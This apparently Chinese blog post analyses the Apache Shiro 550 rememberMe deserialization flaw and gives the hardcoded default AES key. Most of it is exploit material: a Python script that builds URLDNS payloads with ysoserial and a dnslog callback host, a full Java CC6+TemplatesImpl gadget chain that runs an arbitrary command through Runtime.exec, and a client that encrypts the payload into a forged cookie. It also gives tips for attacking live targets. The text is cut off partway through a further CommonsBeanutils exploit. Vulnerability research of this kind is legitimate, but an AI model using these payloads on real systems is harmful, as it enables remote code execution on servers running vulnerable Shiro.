title="漏洞的利用"></a>漏洞的利用</h3><p>先抓个包看看  </p><p>默认账号密码</p><ul><li>root</li><li>secret</li></ul><p><strong>(重点是得勾选这个<code>remember me</code>)</strong></p><p><img src="../images/image-20230619173801606.png" alt="image-20230619173801606"></p><p><strong>固定会返回这个<code>rememberMe=deleteMe</code></strong></p><p>并且这个<code>cookie</code>很长(<strong>这就说明了这个cookie存着一些信息</strong>)</p><p>我们就去代码里找一下看这个<code>cookie</code>是怎么生成的</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p><strong>在登录成功后会对cookie进行编码加密 ，我们来跟一下这个加密流程</strong></p><p>入口是在 <code>AbstractRememberMeManager.onSuccessfulLogin</code> 方法</p><p><img src="../images/image-20230619175908159.png" alt="image-20230619175908159"></p><p>判断 token 是否为 true，然后调用 <code>rememberIdentity</code>：</p><p><img src="../images/image-20230619180002676.png" alt="image-20230619180002676"></p><p>看一下这个 <code>getIdentityToRemember</code>：</p><p><img src="../images/image-20230619180033277.png" alt="image-20230619180033277"></p><p>大致就是获取用户名赋值给 <code>principals</code>。</p><p>回到<code>rememberIdentity</code>跟进<code>this.rememberIdentity(subject, principals)</code>：</p><p><img src="../images/image-20230619180132520.png" alt="image-20230619180132520"></p><p>跟进 <code>convertPrincipalsToBytes</code> 看看：</p><p><img src="../images/image-20230619180150004.png" alt="image-20230619180150004"></p><p>先对用户名进行序列化处理，然后调用了个<code>this.getCipherService()</code>方法是否有返回值，跟进查看：</p><p><img src="../images/image-20230619180226872.png" alt="image-20230619180226872"></p><p>返回了一种 AES 的加密方式CBC。</p><p>回到<code>convertPrincipalsToBytes</code>方法，接着调用<code>this.encrypt(bytes)</code>对序列化后的用户名进行加密操作，跟进：</p><p><img src="../images/image-20230619180301097.png" alt="image-20230619180301097"></p><p>这里同样是先用<code>getCipherService</code>方法获取一个加密方式，如果不是空则用该加密方式调用<code>encrypt</code>方法进行加密，AES加密是个对称加密需要密钥，所以这里用<code>getEncryptionCipherKey</code>获取一个密钥，跟进看看：</p><p><img src="../images/image-20230619180347089.png" alt="image-20230619180347089"></p><p>看来是直接返回了这个密钥，由于我们知道这个漏洞就是因为密钥是硬编码写好的造成的，所以我们往回找找这个密钥是哪里赋值的。</p><p>找到这个AbstractRememberMeManager类初始化的时候会，调用<code>setCipherKey</code>方法来设置密钥：</p><p><img src="../images/image-20230619180422223.png" alt="image-20230619180422223"></p><p>跟进<code>setCipherKey</code>方法瞧一眼：</p><p><strong><img src="../images/image-20230619180444210.png" alt="image-20230619180444210"></strong></p><p>正如上面说的AES是对称加密，加密和解密的密钥是同一个，这里就是用传进来的密钥分别赋值给加密密钥和解密密钥，跟进<code>setEncryptionCipherKey</code>：</p><p><img src="../images/image-20230619180515710.png" alt="image-20230619180515710"></p><p>这里就是直接赋值了（吐槽下，真套呀，不过还能看得懂，没套晕）</p><p>回到AbstractRememberMeManager类初始化的<code>this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</code>这里，这里传入的静态变量DEFAULT_CIPHER_KEY_BYTES实在类定义里面写好的：</p><p><img src="../images/image-20230619180524282.png" alt="image-20230619180524282"></p><p>就是说这个 <code>encryptionCipherKey</code> 是 <code>kPH+bIxk5D2deZiIxcaaaA==</code> 的解密，是一个常量 就是说让用户名的序列化和一个常量进入 <code>cipherService.encrypt</code> 进行加密：</p><p><img src="../images/image-20230619180616452.png" alt="image-20230619180616452"></p><p>具体加密就不看了，不懂密码学。</p><p>总之对学列化后的用户名进行AES加密之后会返回字节到<code>rememberIdentity</code>方法：</p><p><img src="../images/image-20230619180706415.png" alt="image-20230619180706415"></p><p>进入下一步的<code>rememberSerializedIdentity</code>方法：</p><p><img src="../images/image-20230619181422498.png" alt="image-20230619181422498"></p><p>刚才都还是在AbstractRememberMeManager类里面调用，这时候就来到了CookieRememberMeManager类里面，看类名大概能猜到是处理cookie的了。</p><p>这里逻辑就是对传进来的字节进行base64加密，然后设置为名字为rememberMe的cookie值。(<strong>根据这个函数名得知，这里是会对cookie进行序列化处理的</strong>)</p><h3 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h3><p>现在我们从<code>getRememberedIdentity</code>开始分析，文件位置 <code>org/apache/shiro/mgt/DefaultSecurityManager.java</code></p><p><img src="../images/image-20230619182115535.png" alt="image-20230619182115535"></p><p>跟进到<code>getRememberedPrincipals</code>：</p><p><img src="../images/image-20230619182143104.png" alt="image-20230619182143104"></p><p>继续跟到<code>getRememberedSerializedIdentity</code>：</p><p><img src="../images/image-20230619182230245.png" alt="image-20230619182230245"></p><p>这里的逻辑是先获取cookie中rememberMe的值，然后判断是否是deleteMe，不是则判断是否是符合base64的编码长度，然后再对其进行base64解码，将解码结果返回。</p><p>返回 <code>getRememberedPrincipals</code>方法，下一步跟进 <code>convertBytesToPrincipals</code>方法：</p><p><img src="../images/image-20230619182456872.png" alt="image-20230619182456872"></p><p>可以看到就进行了两个操作 <code>decrypt</code> 和 <code>deserialize</code>。解密就是和加密的逆过程，不多说，进入 <code>deserialize</code>：</p><p><img src="../images/image-20230619182549894.png" alt="image-20230619182549894"></p><p>继续跟进套娃的<code>deserialize</code>：</p><p><img src="../images/image-20230619182713824.png" alt="image-20230619182713824"></p><p>发现<code>readObject</code>方法出现了，下面就可以愉快地进行反序列化了！</p><p><strong>加密解密跟解密都跟完了</strong>  </p><p>(<strong>如果我们能根据这个固定密钥来伪造cookie的话，这样的话就可以进行恶意操作了</strong>)</p><h3 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h3><p>前面说到 Shiro 1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设 置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p><p>那么如何判断密钥是否正确呢？文章<a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标Response包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时，返回包不存在<code>Set-Cookie：rememberMe=deleteMe</code>字段。</p><p>因此我们需要构造payload<strong>排除类型转换错误</strong>，进而准确判断密钥。</p><p>shiro在1.4.2版本之前， AES的模式为CBC， IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。在1.4.2版本后，shiro已经更换加密模式 AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><p><a href="https://www.cnblogs.com/zpchcbd/p/15092263.html">可测试key是否正确</a></p><h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>通过漏洞原理可以知道，构造Payload需要将利用链通过AES加密后在base64编码。将Payload的值设置为rememberMe的cookie值，这里借助ysoserial中的URLDNS链去打，<strong>由于URLDNS不依赖于Commons Collections包，只需要JDK的包就行，所有一半用于检测是否存在漏洞</strong>。</p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">r&#x27;D:\Program Files\Java\jdk1.8.0_301\bin\java.exe&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">r&#x27;F:\CTF资料\CTF工具\ysoserial\target\ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog</span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://dq6w3y.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>将得到的payload用Burp传入rememberMe的cookie值中：</p><p><strong>当存在 JSESSIONID 时，会忽略 rememberMe，所以在攻击时需要将 JSESSIONID 删掉</strong></p><p><img src="../images/image-20230619201344721.png" alt="image-20230619201344721"></p><p><img src="../images/image-20230619201350611.png" alt="image-20230619201350611"></p><p>成功</p><h3 id="CC6-TemplatesImpl链"><a href="#CC6-TemplatesImpl链" class="headerlink" title="CC6+TemplatesImpl链"></a>CC6+TemplatesImpl链</h3><p>但是仅仅是URLDNS是不够的，我们想要的是执行恶意代码，所以先引入Commons Collections 3.2.1 包来进行利用构造。</p><p>(<strong>这里用常规的<code>cc6</code>链子是打不通的，用了话会报错，导致无法执行</strong>)<br>(<strong>就是反序列化流中包含非Java自身的数组，则会出现无法加载类的错误</strong>)</p><p><strong>我们就得去找cc中还有没有没用数组的来替换cc6中使用数组的部分</strong></p><p>这里感兴趣为啥的话可以看看 <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p><img src="../images/20220503212131.png" alt="img"></p><p><strong>这次用这张图片   觉得写的不错</strong></p><p>我们不难发现实际上CC4和CC2是没有用到Transformer数组的，但CC4依赖的是Commons Collections4这个包，当前环境无法使用这条链，拿还有啥方法呢？</p><p>我们可以尝试去改造CC6这条链的后半部分，在CC6链中，我们用到了一个类， <code>TiedMapEntry</code> ，其构造函数接受两个参数，参数1是一个Map，参数2是一个对象key。TiedMapEntry 类有个 <code>getValue</code> 方法，调用了map的get方法，并传入key：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点就是这个<strong>key</strong></p><p>当这个map是<code>LazyMap</code>时，其get方法就是触发<code>transform</code>的关键点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 <code>LazyMap#get</code> 方法的参数key是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化恶意对象。</p><p>但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。此时我们却惊奇的发现，这个 <code>LazyMap#get</code> 的参数key，会被传进<code>transform()</code>，实际上它可以扮演 ConstantTransformer的角色——一个简单的对象传递者。</p><p>我们<code>LazyMap.get(key)</code>直接调用<code>InvokerTransfomer.transform(key)</code>，然后像CC2那样调用<code>TempalteImpl.newTransformer()</code>来完成后续调用。</p><p><img src="../images/20220503224146.png" alt="img"></p><p><strong>最终exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileNmae, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC.CC3</span></span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_name&quot;, &quot;aaaaa&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\Coding\\Java\\VulTest\\CC\\target\\classes\\Shiro\\EvilTemplatesImpl.class&quot;));</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC6</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将生成的<code>ser.bin</code>用加密脚本给进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"> </span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Shiro550Client</span> &#123;</span><br><span class="line">    public static void main(String []args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;E:\\Coding\\Java\\VulTest\\CC\\ser.bin&quot;</span>));</span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>然后再将生成的编码进行<code>cookie</code>传参</strong></p><p><img src="../images/image-20230619205759940.png" alt="image-20230619205759940"></p><h3 id="Commons-Beanutils1链"><a href="#Commons-Beanutils1链" class="headerlink" title="Commons-Beanutils1链"></a>Commons-Beanutils1链</h3><p>上面的CC6+TemplatesImpl链是依赖于Commmons Collections软件包的，如果项目中没有用到的话就无法实现代码执行，那有没有只用Shiro自己的类就能实现代码执行的链呢？答案是有的。这里用到了Apache Commons Beanutils包。</p><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。关于JavaBean的说明可以参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">这篇文章</a>。</p><p>这里的话我也写了一篇文章来说分析这个cb链   <a href="https://ke1nys.github.io/posts/f52590e9.html">java-Commons-BeanUtils</a></p><p><strong>简单来说就是这个链子可以任意进行getter操作</strong></p><p>如何利用这个<code>PropertyUtils.getProperty()</code>方法去构造我们的利用链呢？回顾CC链中没有用到Commons Collections包的部分，再次搬出这张图</p><p><img src="../images/20220504154547.png" alt="img"></p><p>其中红框的部分就是没有用到Commons Collections包的部分，如此一来，CC3中的TemplatesImpl实现类加载任意代码执行是跑不掉的，所以我们要找找那里能调用<code>TemplatesImpl.newTransformer()</code>方法，然后我们找到了<code>TemplatesImpl.getOutputProperties()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的内部调用了 <code>newTransformer()</code>，而 <code>getOutputProperties</code> 这个名字，是以 <code>get</code> 开头，正符合getter的定义。</p><p>所以， <code>PropertyUtils.getProperty( obj, property )</code> 这段代码，当obj是一个 <code>TemplatesImpl</code> 对象，而 <code>property</code> 的值为 <code>outputProperties</code> 时，将会自动调用getter，也就是 <code>TemplatesImpl.getOutputProperties()</code> 方法，触发代码执行。</p><p><img src="../images/20220503224944.png" alt="img"></p><p><strong>这就是一条cb链而已</strong>     <strong>但是这个cb链和上面给的链接的cb链子不是一回事</strong></p><p><strong>因为用的依赖不同</strong>    <strong>所以如果直接用上面的cb链来打的话会执行失败并且报错</strong>   </p><p>所以这里得重新构造(<strong>但是区别不是很大</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 